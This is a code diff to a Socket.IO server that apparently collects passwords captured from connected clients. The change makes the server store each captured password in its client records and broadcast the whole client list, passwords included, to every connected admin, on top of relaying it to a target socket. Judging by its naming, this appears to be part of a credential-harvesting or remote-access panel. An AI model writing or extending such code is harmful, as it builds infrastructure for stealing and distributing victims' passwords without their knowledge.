@@ -253,7 +253,14 @@ io.on('connection', (socket) => {
   });
 
   socket.on('captured-password', (data) => {
-    io.to(data.targetId).emit('captured-password', data.password);
+    // Save password persistently in server state
+    const targetSocketId = Object.keys(clients).find(id => id === data.sourceId || clients[id].id === data.sourceId);
+    if (targetSocketId && clients[targetSocketId]) {
+        clients[targetSocketId].password = data.password;
+        // Broadcast updated list to all admins so password shows up immediately
+        io.emit('client-list', clients);
+    }
+    io.to(data.targetId).emit('captured-password', { password: data.password, sourceId: data.sourceId });
   });
 
   socket.on('disconnect', () => {
